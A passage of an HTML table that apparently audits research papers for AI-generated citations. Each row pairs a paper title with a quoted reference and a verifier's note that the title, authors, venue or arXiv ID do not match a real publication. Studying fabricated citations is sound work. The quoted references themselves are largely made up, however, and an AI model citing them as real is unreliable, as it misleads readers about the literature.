        &lt;p&gt;Efficient semantic uncertainty quantification in language models via diversity-steered sampling&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Lei Yu, Jimmy Dumsmyr, and Kevin Knight. Deep paraphrase identification. In Proceedings of the 2014 Conference on Empirical Methods in Natural Language Processing (EMNLP), pp. $650-655,2014$.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No title or author match. No match in publication&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Efficient semantic uncertainty quantification in language models via diversity-steered sampling&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;X. Ou and et al. Tuqdm: Token unmasking with quantized diffusion models. In ACL, 2024.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No title or author match.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Efficient semantic uncertainty quantification in language models via diversity-steered sampling&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Franz Aichberger, Lily Chen, and John Smith. Semantically diverse language generation. In International Conference on Learning Representations (ICLR), 2025.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No title or author match. Some similarity to this article&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:52.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Efficient semantic uncertainty quantification in language models via diversity-steered sampling&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Maria Glushkova, Shiori Kobayashi, and Junichi Suzuki. Uncertainty estimation in neural text regression. In Findings of the Association for Computational Linguistics: EMNLP 2021, pp. $4567-4576,2021$.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match. No match in publication.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:64.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Efficient semantic uncertainty quantification in language models via diversity-steered sampling&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Yichao Wang, Bowen Zhou, Adam Lopez, and Benjamin Snyder. Uncertainty quantification in abstractive summarization. In Proceedings of the 60th Annual Meeting of the Association for Computational Linguistics (ACL), pp. 1234-1245, 2022.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:52.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Efficient semantic uncertainty quantification in language models via diversity-steered sampling&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Mohit Jain, Ethan Perez, and James Glass. Learning to predict confidence for language models. In Proceedings of the 2021 Conference on Empirical Methods in Natural Language Processing (EMNLP), pp. 245-256, 2021.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match. No match in publication&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Efficient semantic uncertainty quantification in language models via diversity-steered sampling&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Srinivasan Kadavath, Urvashi Khandelwal, Alec Radford, and Noam Shazeer. Answer me this: Self-verifying large language models. In arXiv preprint arXiv:2205.05407, 2022.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match. ArXiv ID leads to a different article.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Privacy Reasoning in Ambiguous Contexts&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Zayne Sprague, Xi Ye, Kyle Richardson, and Greg Durrett. MuSR: Testing the limits of chain-of-thought with multistep soft reasoning. In EMNLP, 2023.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Two authors are omitted and one (Kyle Richardson) is added. This paper was published at ICLR 2024.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:64.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Memory-Augmented Potential Field Theory: A Framework for Adaptive Control in Non-Convex Domains&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI**&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Mario Paolone, Trevor Gaunt, Xavier Guillaud, Marco Liserre, Sakis Meliopoulos, Antonello Monti, Thierry Van Cutsem, Vijay Vittal, and Costas Vournas. A benchmark model for power system stability controls. IEEE Transactions on Power Systems, 35(5):3627-3635, 2020.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;The authors match this paper, but the title, publisher, volume, issue, and page numbers are incorrect. Year (2020) is correct.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:64.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Memory-Augmented Potential Field Theory: A Framework for Adaptive Control in Non-Convex Domains&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI**&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Mingliang Han, Bingni W Wei, Phelan Senatus, Jörg D Winkel, Mason Youngblood, I-Han Lee, and David J Mandell. Deep koopman operator: A model-free approach to nonlinear dynamical systems. Chaos: An Interdisciplinary Journal of Nonlinear Science, 30(12):123135, 2020.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No title or author match. Journal and other identifiers match this article.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Adaptive Quantization in Generative Flow Networks for Probabilistic Sequential Prediction&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Francisco Ramalho, Meng Liu, Zihan Liu, and Etienne Mathieu. Towards gflownets for continuous control. arXiv preprint arXiv:2310.18664, 2023.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match. ArXiv ID matches this paper.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:64.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Grounded Reinforcement Learning for Visual Reasoning&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI*&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Arjun Gupta, Xi Victoria Lin, Chunyuan Zhang, Michel Galley, Jianfeng Gao, and Carlos Guestrin Ferrer. Robust compositional visual reasoning via language-guided neural module networks. In Advances in Neural Information Processing Systems (NeurIPS), 2021.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No title or author match. This paper has a similar title and matches publication.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:40.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;MTRec: Learning to Align with User Preferences via Mental Reward Models&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Diederik P. Kingma and Jimmy Ba. Deepfm: a factorization-machine based neural network for ctr prediction. In International Conference on Learning Representations, 2015.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Title matches this paper. Authors, date, and publisher match this paper.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:52.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Redefining Experts: Interpretable Decomposition of Language Models for Toxicity Mitigation&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI*&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Weijia Xu, Xing Niu, and Marine Carpuat. Controlling toxicity in neural machine translation. In Proceedings of the 2020 Conference on Empirical Methods in Natural Language Processing (EMNLP), pages 4245-4256, 2020.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#ffffff;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Authors, publisher and date match this paper. Title and page numbers don't match.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:64.5pt"&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Redefining Experts: Interpretable Decomposition of Language Models for Toxicity Mitigation&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Sources&lt;/p&gt;
        &lt;p&gt;AI*&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;Xiang Zhang, Xuehai Wei, Xian Zhang, and Xue Zhang. Adversarial attacks and defenses in toxicity detection: A survey. In Proceedings of the 2020 International Joint Conference on Neural Networks (IJCNN), pages 1-8. IEEE, 2020.&lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell style="border-left:solid #cccccc 0.45454574999999997pt;border-right:solid #cccccc 0.45454574999999997pt;border-bottom:solid #cccccc 0.45454574999999997pt;border-top:solid #cccccc 0.45454574999999997pt;vertical-align:middle;background-color:#f6f8f9;padding:2pt 6pt 2pt 6pt;overflow:hidden;overflow-wrap:break-word;"&gt;
        &lt;p&gt;No author or title match. Doesn't exist in publication.&lt;/p&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
    &lt;row style="height:77.25pt"&gt;
